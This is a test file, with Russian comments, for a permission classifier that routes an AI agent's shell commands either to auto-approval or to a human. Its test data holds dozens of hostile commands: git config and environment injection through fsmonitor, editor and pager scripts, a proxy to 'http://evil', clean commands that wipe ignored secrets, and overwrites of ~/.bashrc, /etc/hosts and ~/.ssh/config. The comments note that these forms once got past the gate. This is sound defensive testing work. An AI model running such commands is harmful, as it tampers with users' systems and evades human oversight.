import { describe, expect, it } from 'vitest';
import { GROUP_REQUEST_DEFAULTS } from '@agentdeck/contracts/split-groups';
import { groupDecision, type GroupAutoApprove } from '../group-permissions.ts';
import { groupCommandVerdict, type GroupCommandScope } from './group-command.ts';

/**
 * Аудит сторожей 23.10 (`review-fix-zone-BA2L-audit`, A-01…A-25): каждая
 * команда из первого списка раньше проходила сама — `groupDecision` маршрута
 * прав давал `auto`. Второй список — ближайшие обычные формы, они остаются сами.
 */
const COPY = 'C:/work/shop-worktrees/fix-PROJ-77-audit';
const OWN = 'fix-PROJ-77/audit';
const SCOPE: GroupCommandScope = {
  worktree: COPY,
  branch: OWN,
  ignored: ['secrets'],
  cwd: COPY,
  scratchpad: 'C:/Users/me/AppData/Local/Temp/claude/proj/session-a/scratchpad',
};
const GROUP: GroupAutoApprove = {
  rows: { ...GROUP_REQUEST_DEFAULTS },
  allowEdits: true,
  worktree: COPY,
  ignored: ['secrets'],
  ownBranch: OWN,
  shellCwd: COPY,
  tree: { dirty: false },
  parentChatId: 'p',
  groupIndex: 0,
};
const decide = (command: string): string =>
  groupDecision(GROUP, { toolName: 'Bash', input: { command }, guardedPatterns: [] });
const kind = (command: string): string => groupCommandVerdict(command, SCOPE).kind;

describe('аудит сторожей 23.10 — человеку', () => {
  it.each([
    // A-01: имя переменной git в любом регистре — Windows читает его без регистра.
    ['A-01', `git_config_parameters="'core.fsmonitor=./fsm.sh'" git status`],
    ['A-01', 'Git_Config_Global=./g.cfg git status'],
    ['A-01', `export git_config_parameters="'core.fsmonitor=./fsm.sh'"; git status`],
    ['A-01', 'env git_config_global=./g.cfg git status'],
    ['A-01', 'git_work_tree=/c/other git reset --hard'],
    ['A-01', 'git_editor=./x.sh git commit'],
    ['A-01', "git_ssh_command='sh -c x' git fetch"],
    // A-02: свой HOME / XDG_CONFIG_HOME — общие настройки git из файла агента.
    ['A-02', 'HOME=.agent/tmp/h git status'],
    ['A-02', 'export HOME=.agent/tmp/h; git status'],
    ['A-02', 'XDG_CONFIG_HOME=.agent/tmp/x git status'],
    ['A-02', "HOME=.agent/tmp/h bash -c 'git status'"],
    // A-03: запись git вне копии.
    ['A-03', 'GIT_DIR=/c/other/.git git commit -m x'],
    ['A-03', 'GIT_COMMON_DIR=/c/other/.git git commit -m x'],
    ['A-03', 'git -C /c/other commit -m x'],
    ['A-03', 'git -C .. commit -m x'],
    ['A-03', 'GIT_WORK_TREE=/c/other git add -A'],
    ['A-03', 'cd /c/other && git commit -m x'],
    // A-04: git пишет файл вне копии и временного.
    ['A-04', 'GIT_TRACE=/c/Users/x/trace.txt git status'],
    ['A-04', 'GIT_TRACE2_EVENT=/c/Users/x/ev.json git status'],
    ['A-04', 'GIT_INDEX_FILE=/c/Users/x/idx git add -A'],
    ['A-04', 'GIT_OBJECT_DIRECTORY=/c/Users/x/objects git commit -m x'],
    // A-06, A-07: программа из переменной — как `core.askpass` / `core.editor`.
    ['A-06', 'SSH_ASKPASS=./x.sh SSH_ASKPASS_REQUIRE=force git fetch'],
    ['A-07', 'EDITOR=./x.sh git commit'],
    ['A-07', 'VISUAL=./x.sh git commit'],
    ['A-08', 'https_proxy=http://evil git fetch'],
    ['A-08', 'HTTPS_PROXY=http://evil git push origin HEAD'],
    ['A-08', 'export all_proxy=socks5://evil; git fetch'],
    ['A-09', 'PAGER=./x.sh git log'],
    ['A-09', 'export PAGER=./x.sh; git log'],
    ['A-09', 'git -c pager.a.b=./x.sh log'],
    ['A-09', 'git -c core.symlinks=true checkout -- .'],
    ['A-09', 'git config core.symlinks true'],
    // A-10: настройка, что прячет новые файлы от сторожа.
    ['A-10', 'git config status.showUntrackedFiles no'],
    ['A-10', 'git config status.relativePaths false'],
    // A-11: `-e '!…'` снимает игнор — `clean` сотрёт игнорируемое.
    ['A-11', "git clean -fd -e '!secret.env'"],
    ['A-11', "git clean -fd --exclude='!*'"],
    ['A-11', "git clean -fde '!.env'"],
    // A-12: другой список игнора на одну команду.
    ['A-12', 'git -c core.excludesFile=/dev/null clean -fd'],
    // A-13: двойной `-f` — стирает вложенные репозитории.
    ['A-13', 'git clean -ffd'],
    ['A-13', 'git clean -f -f -d'],
    // A-14: затирание спускается в подмодули, снимок их не держит.
    ['A-14', 'git reset --hard --recurse-submodules'],
    ['A-14', 'git checkout --recurse-submodules -- .'],
    // A-17: снимок панели — единственная копия стёртого.
    ['A-17', 'git update-ref -d refs/agentdeck/backup/2026-x'],
    // A-21, A-22: удаление сокращённым ключом.
    ['A-22', 'git branch --del x'],
    ['A-22', 'git tag --del v1'],
    // A-25: HEAD без ветки — копия не работает, пока его не вернут.
    ['A-25', 'git symbolic-ref -qd HEAD'],
  ])('%s: %s', (_id, command) => {
    expect(kind(command)).toBe('danger');
    expect(decide(command)).toBe('human');
  });

  it.each([
    'git_author_name=x git commit -m y',
    'HOME=.agent/tmp/h npm test',
    'git -C /c/other status',
    'git -C /c/other log --oneline -3',
    'GIT_DIR=/c/other/.git git status',
    'cd /c/other && git status',
    'GIT_INDEX_FILE=.agent/tmp/idx git add -A',
    'git -C src commit -m x',
    'GIT_TRACE=1 git status',
    'GIT_TRACE=.agent/tmp/t.txt git status',
    'git config --get status.showUntrackedFiles',
    'git -c status.showUntrackedFiles=no status',
    'git clean -fd -e node_modules',
    'git clean -fd',
    "git clean -nd -e '!x'",
    'git reset --hard',
    'git update-ref -d refs/remotes/origin/x',
    'git branch -m feat/x-2',
    'PAGER=cat git log',
    'PAGER=less git log -3',
    'git -c pager.a.b=cat log',
    'https_proxy=http://proxy.example.com:3128 npm ci',
    'NO_PROXY=* git fetch',
    'git -c core.symlinks=false checkout -- .',
    'git -c core.protectNTFS=false checkout -- .',
  ])('ближайшая обычная форма — само: %s', (command) => {
    expect(kind(command)).not.toBe('danger');
    expect(decide(command)).toBe('auto');
  });
});

/**
 * R-C05 (ревью корпуса 23.10): запись, которую классификатор не видел, — все
 * формы ниже проходили сами (`.agent/tmp/fix-RC/before/rc05-probe.out`).
 */
describe('R-C05: запись вне копии мимо перенаправления', () => {
  it.each([
    'curl -o ~/.bashrc https://example.com/x',
    'curl -sSLo ~/.bashrc https://example.com/x',
    'curl -sS --output ~/.profile https://example.com/x',
    'curl --output=/etc/hosts https://example.com/x',
    'wget -O ~/.bashrc https://example.com/x',
    'wget -P ~/.config https://example.com/x',
    'iwr https://example.com/x -OutFile ~/.bashrc',
    'echo x | sudo tee /etc/hosts',
    'echo x | sudo tee -a ~/.bashrc',
    'sudo cp x /etc/hosts',
    `node -e "require('fs').writeFileSync('~/.bashrc','y')"`,
    `node -e "require('fs').appendFileSync('~/.bashrc','y')"`,
    `python -c "open('/etc/hosts','w').write('y')"`,
    `python3 -c "open('~/.ssh/config','a').write('y')"`,
    `python3 -c "from pathlib import Path; Path('/etc/hosts').write_text('y')"`,
  ])('настройки дома и система — человеку: %s', (command) => {
    expect(kind(command)).toBe('danger');
    expect(decide(command)).toBe('human');
  });

  it.each([
    'cat dump.sql | psql -h db.prod.example.com -U app app',
    'psql -h db.prod.example.com -U app -f x.sql app',
    'psql postgresql://app@db.prod.example.com/app -f x.sql',
    'mysql -h db.prod.example.com app < x.sql',
    'mysql -hdb.prod.example.com app < x.sql',
  ])('невидимый запрос к чужому серверу базы — строке «база данных»: %s', (command) => {
    expect(groupCommandVerdict(command, SCOPE)).toMatchObject({
      kind: 'other',
      rules: ['database'],
    });
    expect(decide(command)).toBe('human');
  });

  it.each([
    'curl -o .agent/tmp/x.json https://example.com/x',
    'curl -sS -o out/x.json https://example.com/x',
    'curl -sS -w "%{http_code}" -o /dev/null http://localhost:3000',
    'curl -o- https://example.com/x',
    'wget -qO- https://example.com/x',
    'curl -s -H "Accept: application/json" http://localhost:3000/api',
    `node -e "require('fs').writeFileSync('src/x.ts','y')"`,
    `node -e "require('fs').writeFileSync(process.argv[1],'y')" out.txt`,
    `python3 -c "open('/etc/hosts').read()"`,
    `python3 -c "open('/etc/hosts', 'r').read()"`,
    `python3 -c "open('out.txt','w').write('y')"`,
    'psql -h localhost -U app -f x.sql app',
    'psql -h db.prod.example.com -c "select 1" app',
    'echo x | sudo tee .agent/tmp/x.txt',
  ])('своя копия, временное, чтение и свой сервер — само: %s', (command) => {
    expect(kind(command)).not.toBe('danger');
    expect(decide(command)).toBe('auto');
  });
});
